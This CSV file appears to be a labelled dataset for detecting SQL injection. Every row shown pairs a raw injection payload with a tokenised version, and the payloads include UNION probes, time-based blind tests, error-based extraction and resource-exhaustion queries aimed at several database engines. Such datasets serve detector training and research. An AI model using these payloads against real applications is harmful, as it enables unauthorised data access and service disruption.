Query,Label,Query_cleaned
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  'ldqq'  =  'ldqq",1,select count from generate_series 1 5000000 and ldqq ldqq
1 where 8095  =  8095,1,1 where 8095 8095
"1""  )   where 8196  =  8196",1,1 where 8196 8196
1  )   where 2010  =  2010,1,1 where 2010 2010
"1%""   )    )     )   and sleep  (  5  )  #",1,1 and sleep 5
"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,1,1 and 5556 select count from all_users t1 all_users t2 all_users t3 all_users t4 all_users t5 and
1%'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,1 and 8594 select 8594 from pg_sleep 5
1'  )   where 6045  =  6045,1,1 where 6045 6045
select   (  case when   (  9393  =  5530  )   then 9393 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,select case when 9393 5530 then 9393 else cast 1 as int select 0 from dual end from dual
"1""  )   where 2702  =  2702 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,1 where 2702 2702 and 6537 dbms_pipe receive_message chr 76 chr 116 chr 117 chr 65 5
"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""ctrr""  =  ""ctrr",1,1 or 8421 select count from generate_series 1 5000000 and ctrr ctrr
-8187'   )    )     )   or 1698  =  2823#,1,8187 or 1698 2823
"-3347%"" or 9323  =  9323#",1,3347 or 9323 9323
"1%"" and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,1 and char 109 char 79 char 70 char 90 regexp_substring repeat right char 5012 0 5000000000 null
"1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm",1,1 or extractvalue 1297 concat 0x5c 0x7171706a71 select elt 1297 1297 1 0x717a767a71 and skdm skdm
1'   )    )    as qaki where 5272  =  5272,1,1 as qaki where 5272 5272
1'||  (  select 'bqhi' from dual where 7409  =  7409,1,1 select bqhi from dual where 7409 7409
"-2325  )   union all select 4692,4692,4692,4692#",1,2325 union all select 4692 4692 4692 4692
"-1418""  )   where 7528  =  7528 order by 1#",1,1418 where 7528 7528 order by 1
"1%'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  '%'  =  '",1,1 and 6537 dbms_pipe receive_message chr 76 chr 116 chr 117 chr 65 5 and
1'   )    )    as tley where 3539  =  3539,1,1 as tley where 3539 3539
 (  select   (  case when   (  6461  =  1802  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  ) ,1,select case when 6461 1802 then 1 else cast 1 as int select 0 from dual end from dual
"1""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""ilge"" like ""ilge",1,1 and elt 1210 1210 sleep 5 and ilge like ilge
-6518'   )    )    as vocx where 2539  =  2539 or   (  8652  =  2025  )  *2025--,1,6518 as vocx where 2539 2539 or 8652 2025 2025
"1%"" and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1 and 9660 select count from all_users t1 all_users t2 all_users t3 all_users t4 all_users t5
"1%'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  '%'  =  '",1,1 or 8466 benchmark 5000000 md5 0x694a4745 and
"1%""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""%""  =  """,1,1 or exp select from select concat 0x7171706a71 select elt 6270 6270 1 0x717a767a71 0x78 x and
"1""  )   as fkco where 8877  =  8877 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,1 as fkco where 8877 8877 or select 9173 from select count concat 0x7171706a71 select elt 9173 9173 1 0x717a767a71 floor rand 0 2 x from information_schema character_sets group by x a
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""ewsr"" like ""ewsr",1,select like abcdefg upper hex randomblob 500000000 2 and ewsr like ewsr
"1""   )    )    and 5421  =  4804--",1,1 and 5421 4804
1'||  (  select 'zzkx' where 3270  =  3270 and 2006  =  2006,1,1 select zzkx where 3270 3270 and 2006 2006
"  (  select   (  case when   (  3531  =  3531  )   then   (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   else 3531 end   )    )   ",1,select case when 3531 3531 then select count from sysusers as sys1 sysusers as sys2 sysusers as sys3 sysusers as sys4 sysusers as sys5 sysusers as sys6 sysusers as sys7 else 3531 end
select   (  case when   (  4205  =  9574  )   then 4205 else 1/  (  select 0  )   end  )  --,1,select case when 4205 9574 then 4205 else 1 select 0 end
"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",1,3862 union all select 2495 2495 2495 2495 2495 2495 2495
"1'  )   as pfwt where 8448  =  8448 union all select null,null,null,null,null,null,null,null,null#",1,1 as pfwt where 8448 8448 union all select null null null null null null null null null
1'  )   and   (  3020  =  3020  )  *6703 and   (  'rskq'  =  'rskq,1,1 and 3020 3020 6703 and rskq rskq
"-5205'   )    )    union all select 8592,8592,8592,8592,8592,8592--",1,5205 union all select 8592 8592 8592 8592 8592 8592
"1""   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""vjvz"" like ""vjvz",1,1 and 6510 select count from sysusers as sys1 sysusers as sys2 sysusers as sys3 sysusers as sys4 sysusers as sys5 sysusers as sys6 sysusers as sys7 and vjvz like vjvz
"1   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   5200  =  5200",1,1 and 6510 select count from sysusers as sys1 sysusers as sys2 sysusers as sys3 sysusers as sys4 sysusers as sys5 sysusers as sys6 sysusers as sys7 and 5200 5200
1'   )    )    and 2832  =  4165--,1,1 and 2832 4165
1'+  (  select qpaf where 7859  =  7859 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   +',1,1 select qpaf where 7859 7859 or select from select sleep 5 ydpu
"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",1,1 and char 120 char 106 char 117 char 85 regexp_substring repeat right char 9981 0 5000000000 null and cenk cenk
"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",1,1 and 3824 benchmark 5000000 md5 0x76555642 and urxs urxs
select pg_sleep  (  5  )   and    (    (   'vxxg'  =  'vxxg,1,select pg_sleep 5 and vxxg vxxg
"-5518  )   as yvqm where 7360  =  7360 union all select 7360,7360#",1,5518 as yvqm where 7360 7360 union all select 7360 7360
-3359' order by 1--,1,3359 order by 1
"-6618""   )    )     )   order by 1#",1,6618 order by 1
"1'+  (  select 'drvv' where 5622  =  5622 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1 select drvv where 5622 5622 and 3580 select count from domain domains as t1 domain columns as t2 domain tables as t3
"1""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1,1 and 8594 select 8594 from pg_sleep 5
"-3628"" or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1,3628 or 1570 convert int select char 113 char 113 char 112 char 106 char 113 select case when 1570 1570 then char 49 else char 48 end char 113 char 122 char 118 char 122 char 113
"-6492'  )   union all select 7204,7204--",1,6492 union all select 7204 7204
"1""  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""nnmz"" like ""nnmz",1,1 or 5286 select count from all_users t1 all_users t2 all_users t3 all_users t4 all_users t5 and nnmz like nnmz
"-1755%' union all select 2615,2615,2615,2615,2615,2615#",1,1755 union all select 2615 2615 2615 2615 2615 2615
"-9659   )    )     )   union all select 8665,8665,8665,8665,8665,8665,8665--",1,9659 union all select 8665 8665 8665 8665 8665 8665 8665
"1',  (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  9693  =  9693,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1,1 select 2 if select from select concat 0x7171706a71 select elt 9693 9693 1 0x717a767a71 0x78 s 8446744073709551610 8446744073709551610
1' where 5060  =  5060,1,1 where 5060 5060
"-7574%""  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """,1,7574 or 5023 ctxsys drithsx sn 5023 chr 113 chr 113 chr 112 chr 106 chr 113 select case when 5023 5023 then 1 else 0 end from dual chr 113 chr 122 chr 118 chr 122 chr 113 and
"-9347'  )   union all select 3884,3884#",1,9347 union all select 3884 3884
"1"" where 5333  =  5333 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,1 where 5333 5333 and char 109 char 79 char 70 char 90 regexp_substring repeat right char 5012 0 5000000000 null
"-4807' where 3232  =  3232 or make_set  (  6599  =  5179,5179  )  --",1,4807 where 3232 3232 or make_set 6599 5179 5179
1 where 1015  =  1015,1,1 where 1015 1015
"  (  select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ",1,select like abcdefg upper hex randomblob 500000000 2
"1%"" and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,1,1 and 4241 convert int select char 113 char 113 char 112 char 106 char 113 select case when 4241 4241 then char 49 else char 48 end char 113 char 122 char 118 char 122 char 113 and
"1'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ",1,1 and row 6237 7469 select count concat 0x7171706a71 select elt 6237 6237 1 0x717a767a71 floor rand 0 2 x from select 5192 union select 3785 union select 3931 union select 7158 a group by x
"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,1 or 8514 benchmark 5000000 md5 0x544d5a4c
"1'+  (  select 'nmhy' where 2919  =  2919 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1 select nmhy where 2919 2919 and 8189 select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3
1'||  (  select 'boxx' where 2038  =  2038 and 9198  =  9198--,1,1 select boxx where 2038 2038 and 9198 9198
"1%""  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1 and 8189 select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3
"-4304' where 1005  =  1005 union all select 1005,1005#",1,4304 where 1005 1005 union all select 1005 1005
"1  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",1,1 and 3824 benchmark 5000000 md5 0x76555642
1'+  (  select 'zjvx' where 4683  =  4683 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  +',1,1 select zjvx where 4683 4683 and 6969 select 6969 from pg_sleep 5
"1%'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  '%'  =  '",1,1 or elt 6272 6272 sleep 5 and
"1'||  (  select 'txyy' where 6500  =  6500 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   ||'",1,1 select txyy where 6500 6500 procedure analyse extractvalue 9255 concat 0x5c benchmark 5000000 md5 0x52515a50 1
"1  )   where 8164  =  8164 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1 where 8164 8164 or 2367 select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4
1'  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'nxkp' like 'nxkp,1,1 and 7756 dbms_utility sqlid_to_sqlhash chr 113 chr 113 chr 112 chr 106 chr 113 select case when 7756 7756 then 1 else 0 end from dual chr 113 chr 122 chr 118 chr 122 chr 113 and nxkp like nxkp
-2625'   )    )    or 3038  =  3038,1,2625 or 3038 3038
"1'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'miba'  =  'miba",1,1 and 8514 select count from domain domains as t1 domain columns as t2 domain tables as t3 and miba miba
"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""vwep"" like ""vwep",1,1 or 9643 select count from domain domains as t1 domain columns as t2 domain tables as t3 and vwep like vwep
"1%""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  ""%""  =  """,1,1 procedure analyse extractvalue 5840 concat 0x5c 0x7171706a71 select case when 5840 5840 then 1 else 0 end 0x717a767a71 1 and
"1'   )    )    as orvy where 7270  =  7270 union all select null,null,null,null,null,null,null,null#",1,1 as orvy where 7270 7270 union all select null null null null null null null null
"1""   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""dwcy""  =  ""dwcy",1,1 and 2853 cast chr 113 chr 113 chr 112 chr 106 chr 113 select case when 2853 2853 then 1 else 0 end text chr 113 chr 122 chr 118 chr 122 chr 113 as numeric and dwcy dwcy
"-1218' union all select 2663,2663,2663,2663--",1,1218 union all select 2663 2663 2663 2663
1%'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,1 rlike select from select sleep 5 vwyq
"1  )   union all select null,null,null#",1,1 union all select null null null
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  ""oiuw""  =  ""oiuw",1,select dbms_pipe receive_message chr 66 chr 67 chr 79 chr 101 5 from dual and oiuw oiuw
